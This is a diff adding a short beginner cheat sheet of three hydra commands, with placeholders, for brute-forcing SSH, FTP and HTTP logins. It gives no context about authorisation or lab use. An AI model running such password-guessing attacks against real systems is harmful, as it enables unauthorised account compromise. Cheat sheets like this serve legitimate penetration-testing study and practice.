@@ -1,0 +1,10 @@
+# Hydra Password Bruteforce (Beginner Example)
+
+1. SSH bruteforce
+hydra -l <username> -P <wordlist> ssh://<target-ip>
+
+2. FTP bruteforce
+hydra -l <username> -P <wordlist> ftp://<target-ip>
+
+3. HTTP login bruteforce (simple)
+hydra -l admin -P <wordlist> <target-ip> http-get /
